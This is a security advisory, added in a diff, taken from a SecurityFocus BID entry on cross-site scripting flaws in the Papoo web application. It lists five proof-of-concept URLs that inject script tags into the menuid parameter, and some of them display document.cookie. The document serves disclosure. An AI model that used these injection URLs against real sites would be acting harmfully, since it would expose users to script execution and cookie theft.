@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/16573/info
+
+Papoo is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Specific information regarding affected versions is not currently available; this BID will be updated as further information is disclosed. 
+
+http://www.example.com/guestbook.php?menuid=<script>alert('HELLO');</script>
+http://www.example.com/index.php?menuid=<script>alert(document.cookie);</script>
+http://www.example.com/inhalt.php?menuid=<script>alert(document.cookie);</script>
+http://www.example.com/forum.php?menuid=<script>alert('HELLO');</script>
+http://www.example.com/kontakt.php?menuid=<script>alert('HELLO');</script> 
